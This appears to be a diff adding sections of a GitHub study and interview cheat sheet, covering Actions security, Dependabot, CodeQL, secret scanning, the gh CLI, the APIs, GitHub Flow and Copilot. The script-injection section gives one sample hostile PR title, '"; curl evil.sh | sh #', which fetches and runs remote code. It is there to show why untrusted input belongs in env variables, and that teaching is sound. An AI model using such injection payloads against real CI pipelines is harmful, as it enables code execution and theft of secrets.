+## Actions Security Pitfalls | violet
+```yaml
+- name: Unsafe                    # actionlint: "github.event.pull_request.title" is potentially untrusted
+  run: echo "Thanks for ${{ github.event.pull_request.title }}"
+- name: Safe
+  env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "Thanks for $TITLE"
+```
+- **Script injection**: `${{ }}` is substituted **into the script text before the shell runs**, so an attacker-controlled PR title such as `"; curl evil.sh | sh #` becomes code. Pass untrusted values through **environment variables** (verified: actionlint flags the first form).
+- **`pull_request_target`** runs in the context of the **base repository with secrets and a write token**, even for PRs from forks. Never check out and build the fork's code in it.
+- **Pin third-party actions to a full commit SHA** (`uses: some/action@8f4b7f8...`): tags can be moved by a compromised maintainer. Organisations can require SHA pinning and allow-list actions; Dependabot keeps pins updated.
+- **Self-hosted runners**: never use them for **public** repositories (any fork PR could run code on your machine); prefer **ephemeral** runners (one job each) and isolate them from production networks.
+
+## Interview Q&A | sky | wide
+Q: How do you deploy from GitHub Actions without storing cloud keys?
+A: Use OIDC: give the job id-token: write, configure the cloud provider to trust GitHub's OIDC issuer with conditions on repository and branch or environment, and exchange the token for short-lived credentials (aws-actions/configure-aws-credentials with role-to-assume).
+Q: What are environments used for?
+A: Deployment targets with protection rules (required reviewers, wait timers, allowed branches) and their own secrets, so production deploys need approval and only main can deploy.
+Q: Reusable workflow vs composite action?
+A: A reusable workflow is called at job level and contains whole jobs with their own runners; a composite action is used as a step and bundles several steps within one job.
+Q: What is script injection in Actions and how do you prevent it?
+A: Untrusted input (PR titles, branch names, issue bodies) interpolated with ${{ }} directly into run: scripts becomes executable code. Pass it through env variables and quote it in the shell.
+Q: Why is pull_request_target dangerous?
+A: It runs with the base repository's secrets and write permissions for PRs from forks; checking out and running the PR's code there hands attackers your secrets.
+Q: How do you limit GITHUB_TOKEN?
+A: Set permissions: at workflow or job level to the minimum (for example contents: read) and make read-only the organisation default.
+Q: Why pin actions to commit SHAs?
+A: Version tags are mutable; a compromised action repository could move a tag to malicious code. A full SHA is immutable.
+
+# 07 | Security Features | Dependency graph and Dependabot (alerts, security updates, version updates), code scanning with CodeQL, secret scanning and push protection, security advisories, SECURITY.md, Advanced Security plans | Security
+
+## Dependency Graph and Dependabot | rose
+- The **dependency graph** reads manifests and lock files (`pom.xml`, `package-lock.json`, `requirements.txt`...) to list your dependencies, including transitive ones.
+- **Dependabot alerts** warn when a dependency has a known vulnerability from the **GitHub Advisory Database**; **Dependabot security updates** open PRs that upgrade to a patched version.
+- **Dependabot version updates** keep dependencies current on a schedule, configured in `.github/dependabot.yml`:
+```yaml .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: maven
+    directory: "/"
+    schedule:
+      interval: weekly                   # daily, weekly, monthly, quarterly, semiannually, yearly or cron
+    groups:
+      spring:
+        patterns: ["org.springframework*"]     # one PR for all Spring updates
+    open-pull-requests-limit: 5
+  - package-ecosystem: npm
+    directory: "/web"
+    schedule:
+      interval: weekly
+    ignore:
+      - dependency-name: "@angular/*"
+        update-types: ["version-update:semver-major"]
+  - package-ecosystem: github-actions    # also updates action versions and SHA pins
+    directory: "/"
+    schedule:
+      interval: monthly
+```
+- The file above validates against the official schema (SchemaStore `dependabot-2.0`). Combine Dependabot with **required CI checks and auto-merge** for patch updates.
+
+## Code Scanning with CodeQL | blue
+```yaml .github/workflows/codeql.yml
+on:
+  push:
+    branches: [main]
+  pull_request:
+  schedule:
+    - cron: "0 3 * * 1"
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: write             # upload results to the Security tab
+      contents: read
+    strategy:
+      matrix:
+        language: [java-kotlin, javascript-typescript]
+    steps:
+      - uses: actions/checkout@v7
+      - uses: github/codeql-action/init@v4
+        with:
+          languages: ${{ matrix.language }}
+          build-mode: none
+      - uses: github/codeql-action/analyze@v4
+```
+- **Code scanning** runs static analysis and shows alerts in the Security tab and **inline on PRs**. **CodeQL** treats code as data and queries it for vulnerability patterns (SQL injection, XSS, path traversal, unsafe deserialisation).
+- **Default setup** enables it with one click; **advanced setup** uses a workflow like the one above. Third-party tools can upload **SARIF** results. **Copilot Autofix** suggests fixes for alerts.
+
+## Secret Scanning and Push Protection | green
+- **Secret scanning** detects tokens and keys (from hundreds of partner providers, plus custom patterns) committed to repositories, issues and PRs. For public repositories, providers are notified so they can **revoke leaked tokens**.
+- **Push protection** **blocks the `git push`** when a supported secret is detected, before it ever reaches the repository; it is on by default for public repositories, and users can enable it for all their pushes.
+- If a secret leaks: **revoke and rotate it first** (removing it from history is not enough, since forks and clones keep it), then clean the history if needed.
+
+## Advisories and Plans | amber
+- **Security advisories**: maintainers privately discuss and fix a vulnerability, request a **CVE**, and publish a **GHSA** advisory. **Private vulnerability reporting** lets researchers report through GitHub, and a **`SECURITY.md`** file describes the policy.
+- Public repositories get the dependency graph, Dependabot, code scanning, secret scanning and push protection **at no cost**. For private repositories, **GitHub Advanced Security** is sold as two products: **GitHub Secret Protection** and **GitHub Code Security** (CodeQL, Copilot Autofix, dependency review).
+- **Dependency review** shows dependency changes and their vulnerabilities in a PR, and can fail the PR.
+
+## Interview Q&A | sky | wide
+Q: What does Dependabot do?
+A: It raises alerts for vulnerable dependencies, opens PRs to upgrade to patched versions (security updates), and, configured in dependabot.yml, regularly opens PRs to keep dependencies and actions current (version updates).
+Q: What is CodeQL?
+A: GitHub's semantic code analysis engine that models code as a queryable database and finds vulnerability patterns; it powers code scanning alerts in the Security tab and on pull requests.
+Q: What is push protection?
+A: Secret scanning applied at push time: it rejects a push containing a recognised secret, so the secret never lands in the repository.
+Q: A developer committed an AWS key. What do you do?
+A: Revoke and rotate the key immediately, check access logs for misuse, then remove it from the code and history, and enable push protection to prevent repeats.
+Q: How do you keep GitHub Actions dependencies up to date?
+A: Add a github-actions ecosystem entry to dependabot.yml; it opens PRs bumping action versions or SHA pins.
+
+# 08 | GitHub CLI, APIs, Apps & Packages | The gh CLI, REST and GraphQL APIs, rate limits, webhooks, GitHub Apps vs OAuth apps vs PATs, Packages and ghcr.io, Releases, Pages | CLI & APIs
+
+## The GitHub CLI (gh) | rose
+```bash
+gh auth login                                   # browser or token login; gh auth setup-git makes git use it
+gh repo clone acme/shop-api
+gh issue create --title "Cart total wrong" --label bug --assignee @me
+gh pr create --fill --draft                     # title and body from commits
+gh pr checks 57                                 # CI status of a PR
+gh pr review 57 --approve
+gh pr merge 57 --squash --auto --delete-branch
+gh run list --limit 5                           # recent workflow runs
+gh run watch --exit-status                      # follow a run; non-zero exit if it fails
+gh workflow run deploy.yml -f environment=staging     # trigger workflow_dispatch with inputs
+gh secret set SONAR_TOKEN --env production
+gh release create v1.4.0 --generate-notes      # tag + release with notes from merged PRs
+gh api repos/acme/shop-api/issues --jq '.[].title'    # call any REST endpoint
+```
+- **`gh`** brings PRs, issues, Actions, releases, secrets and the API to the terminal and to scripts; every command above was checked against **gh 2.102**.
+
+## REST and GraphQL APIs | blue
+- **REST API** (`https://api.github.com`): resource endpoints such as `GET /repos/{owner}/{repo}`, `POST /repos/{owner}/{repo}/issues`. Versioned by date with the **`X-GitHub-Api-Version`** header: `2026-03-10` is the newest, and requests **without the header use `2022-11-28`** (supported until March 2028; each version lives 24 months after its successor).
+- **GraphQL API** (`POST https://api.github.com/graphql`): one endpoint where you request exactly the fields you need; it **always requires authentication** (verified: an anonymous request is rejected with 403).
+- **Rate limits**: **60 requests per hour unauthenticated** (verified: `X-RateLimit-Limit: 60`), **5,000 per hour** with a PAT or OAuth token, **1,000 per hour per repository** for `GITHUB_TOKEN` in Actions, and more for GitHub Apps on large installations. Read the `X-RateLimit-*` headers and back off on 403 or 429.
+
+## Webhooks and GitHub Apps | green
+- **Webhooks** POST a JSON payload to your URL when events happen (push, pull_request, issues, workflow_run). Verify the **`X-Hub-Signature-256`** HMAC-SHA256 signature with your webhook secret, respond quickly (queue the work), and handle **redeliveries** idempotently.
+- **GitHub Apps** (preferred for integrations): installed on chosen repositories with **fine-grained permissions**, acting as a **bot identity**, using **short-lived installation tokens** (1 hour) and receiving webhooks. **OAuth apps** act **as a user** with that user's access. **PATs** are personal credentials for scripts.
+
+## Packages, Releases and Pages | amber
+```yaml .github/workflows/image.yml
+on:
+  release:
+    types: [published]
+jobs:
+  push:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write
+    steps:
+      - uses: actions/checkout@v7
+      - uses: docker/login-action@v4
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      - uses: docker/build-push-action@v7
+        with:
+          push: true
+          tags: ghcr.io/${{ github.repository }}:${{ github.event.release.tag_name }}
+```
+- **GitHub Packages** hosts **containers (`ghcr.io`)**, Maven, Gradle, npm, NuGet and RubyGems packages next to the code, with permissions linked to repositories.
+- **Releases** attach notes and binaries to a **tag** (`v1.4.0`, following **semantic versioning**: MAJOR.MINOR.PATCH); notes can be generated from merged PRs.
+- **GitHub Pages** hosts static sites (docs, SPAs) from a branch or, preferably, from an Actions workflow (`actions/upload-pages-artifact@v5` + `actions/deploy-pages@v5`, with `pages: write` and `id-token: write`), on `<user>.github.io` or a custom domain with HTTPS.
+
+## Interview Q&A | sky | wide
+Q: REST vs GraphQL API on GitHub?
+A: REST has many resource endpoints, simple and cacheable, with date-based versions. GraphQL has one endpoint where a query fetches exactly the nested data needed in one request, and always requires authentication.
+Q: What are GitHub's API rate limits?
+A: 60 requests per hour unauthenticated, 5,000 per hour for an authenticated user token, 1,000 per hour per repository for GITHUB_TOKEN in Actions, with higher limits for GitHub Apps on large installations.
+Q: GitHub App vs OAuth app vs PAT?
+A: A GitHub App is installed on specific repositories with fine-grained permissions, acts as its own bot and uses short-lived tokens; an OAuth app acts on behalf of a signed-in user; a PAT is a user's own credential for scripts. Prefer Apps for integrations.
+Q: How do you secure a webhook receiver?
+A: Use HTTPS, verify the X-Hub-Signature-256 HMAC with the shared secret, reply quickly and process asynchronously, and make processing idempotent because deliveries can be repeated.
+Q: How do you publish a Docker image from GitHub?
+A: An Actions workflow logs in to ghcr.io with GITHUB_TOKEN (packages: write) and runs docker/build-push-action, usually on a release or tag event.
+
+# 09 | GitHub Flow, Releases & Copilot | GitHub Flow, how it relates to GitFlow and trunk-based development, preview and production deployments, semantic versioning and release notes, monorepos, GitHub Copilot | Flow & Copilot
+
+## GitHub Flow | rose
+- **GitHub Flow**: `main` is always deployable; **create a branch** for each change, **commit and push** early, **open a PR**, discuss and **review**, let **CI** run, **deploy** (often a preview environment), then **merge** and deploy `main`.
+- It is a lightweight form of **feature branching** close to **trunk-based development**: short-lived branches, small PRs, continuous integration into `main`. The heavier **GitFlow** (develop, release and hotfix branches) is covered in the Git topic and suits scheduled, versioned releases.
+- Supporting features: required checks and reviews (sheet 04), merge queue, auto-merge, environments, and **feature flags** to merge unfinished work safely.
+
+## Releases and Versioning | blue
+- **Semantic versioning**: **MAJOR** for breaking changes, **MINOR** for backwards-compatible features, **PATCH** for fixes (`1.4.2`). Tags such as `v1.4.2` mark released commits.
+- **Conventional Commits** (`feat:`, `fix:`, `feat!:` or `BREAKING CHANGE:`) let tools compute the next version and changelog automatically (release-please, semantic-release).
+- **Release workflow**: merge to `main`, then a tag or release triggers a workflow that builds, publishes packages or images, and deploys; `gh release create --generate-notes` writes notes from merged PRs.
+- **Monorepos**: `paths` filters on triggers, CODEOWNERS per directory, and matrix or reusable workflows per service keep CI fast.
+
+## GitHub Copilot | green
+- **GitHub Copilot** is GitHub's AI coding assistant: **code completion** in the IDE, **Copilot Chat** (IDE, GitHub.com, CLI), **agent mode** in the IDE for multi-file tasks, **Copilot code review** on pull requests, and the **Copilot cloud agent**, which works on an assigned issue in its own Actions-powered environment and opens a pull request for review.
+- **Plans** (October 2026): **Copilot Free** (limited, for example 2,000 completions a month), **Student**, **Pro** ($10 a month), **Pro+** ($39), **Max** ($100) for individuals; **Business** ($19 per seat) and **Enterprise** ($39 per seat) for organisations, with policy controls. Usage of premium models is metered in **GitHub AI Credits**. Plans and features change often, so check before quoting.
+- Use it responsibly: **review every suggestion** like a teammate's code, keep tests and CI as the gate, avoid pasting secrets, and use organisation policies (content exclusions, public-code filtering) to manage risk.
+
+## Interview Q&A | sky | wide
+Q: What is GitHub Flow?
+A: A lightweight workflow where main is always deployable: create a short-lived branch, push commits, open a pull request, review with CI checks, deploy, and merge into main.
+Q: GitHub Flow vs GitFlow?
+A: GitHub Flow uses only main plus short-lived feature branches and suits continuous deployment. GitFlow adds develop, release and hotfix branches for scheduled, versioned releases, at the cost of more merging.
+Q: How does semantic versioning work?
+A: MAJOR.MINOR.PATCH: increment MAJOR for breaking changes, MINOR for backwards-compatible features, PATCH for backwards-compatible fixes.
+Q: How do you automate releases on GitHub?
+A: Conventional commits plus a tool such as release-please, or a workflow triggered by tags or published releases that builds, tests, publishes packages and images, and generates release notes from merged PRs.
+Q: How should a team use GitHub Copilot safely?
+A: Treat suggestions as untrusted code: review them, keep tests and required checks, never include secrets in prompts, and apply organisation policies such as content exclusions and public-code filtering.
+
+@ Review
+
+# 10 | Rapid-Fire & Scenarios | Tricky questions, one-liners, design scenarios, big Q&A | Rapid-fire
+
+## Tricky Questions | rose
+- **"remote: Support for password authentication was removed"**: use a personal access token, SSH, or `gh auth login`.
+- **"My workflow did not trigger after the bot pushed"**: events created with `GITHUB_TOKEN` do not start new runs; use a GitHub App token or `workflow_dispatch`.
+- **"Secrets are empty in PR builds"**: PRs from forks do not receive secrets.
+- **"Issue did not close"**: the PR must contain a closing keyword and merge into the **default** branch.
+- **"Required check never reports"**: the job name changed or path filters skipped the workflow, so the required status stays pending.
+- **"Commits show Unverified"**: the signing key is not added to GitHub as a signing key, or the commit email does not match a verified email.
+- **"Scheduled workflow stopped running"**: public repositories disable schedules after 60 days of inactivity; schedules also run only on the default branch.
+- **"Rebase and merge changed my SHAs"**: rebasing replays commits as new commits.
+
+## One-Line Cheat Sheet | blue
+- **Git vs GitHub**: tool vs platform (PRs, issues, Actions, security, packages).
+- **Auth**: fine-grained PATs, SSH keys (ed25519), 2FA, signed commits (Verified).
+- **PRs**: draft, reviews (comment, approve, request changes), suggestions, CODEOWNERS, `Closes #42`, merge / squash / rebase.
+- **Protection**: rulesets (branches and tags, bypass list, layering), required reviews and checks, linear history, merge queue (`merge_group`), auto-merge.
+- **Actions**: `.github/workflows`, `on`, jobs (`needs`, `runs-on`, `strategy.matrix`), steps (`run`, `uses`), contexts, `$GITHUB_OUTPUT`, secrets and vars, cache vs artifacts, `concurrency`.
+- **Deploy and secure**: environments, OIDC (`id-token: write`), `permissions:`, reusable workflows vs composite actions, script injection, `pull_request_target`, SHA pinning.
+- **Security**: Dependabot (alerts, security and version updates), CodeQL, secret scanning and push protection, advisories.
+- **Platform**: `gh`, REST (dated versions) and GraphQL, rate limits, webhooks (signature), GitHub Apps, ghcr.io, Releases, Pages, Copilot.
+
+## How to Answer Well | green
+- Describe the **workflow end to end**: branch, PR, checks, review, rules, merge, deploy. Name the **feature** that enforces each step and the **security** angle (least privilege, OIDC, pinning, push protection).
+- Tie it to experience: "We required two approvals and the CI checks via a ruleset, deployed with OIDC to AWS from a protected production environment, and let Dependabot patch updates auto-merge after CI."
+
+## Big Interview Q&A | sky | wide
+Q: Design a GitHub setup for a team of 10 working on a Spring Boot service and an Angular front end.
+A: One repository (or two) with a ruleset on main requiring PRs, one or two approvals, CODEOWNERS for backend and frontend paths, required CI checks and linear history; GitHub Flow with small PRs and squash merges; CI workflows with matrices and caching; CodeQL, Dependabot and push protection on; deployments through environments with OIDC; releases tagged with semantic versions and generated notes.
+Q: How do you secure GitHub Actions in an organisation?
+A: Read-only default GITHUB_TOKEN with explicit permissions per job, OIDC instead of stored cloud keys, environments with reviewers for production, actions allow-listed and pinned to SHAs, untrusted input passed via env, no pull_request_target with checkout of fork code, ephemeral and isolated self-hosted runners, and secret scanning with push protection.
+Q: A PR is approved but cannot be merged. What do you check?
+A: Failing or pending required status checks, unresolved conversations, a branch that is out of date or has conflicts, missing Code Owner approval, approvals dismissed by new commits, signed-commit or linear-history rules, or a merge queue requirement.
+Q: How would you speed up a slow CI pipeline?
+A: Cache dependencies, split tests into parallel matrix jobs, use paths filters to skip unaffected parts, cancel superseded runs with concurrency, use larger or Arm runners where it pays, and reuse build outputs through artifacts instead of rebuilding.
+Q: How do you migrate a project from Jenkins to GitHub Actions?
+A: Map each Jenkinsfile stage to jobs and steps, replace plugins with marketplace actions, move credentials to secrets or OIDC, replicate triggers with on: events, run both pipelines in parallel for a while, and then switch the required checks to the Actions jobs.
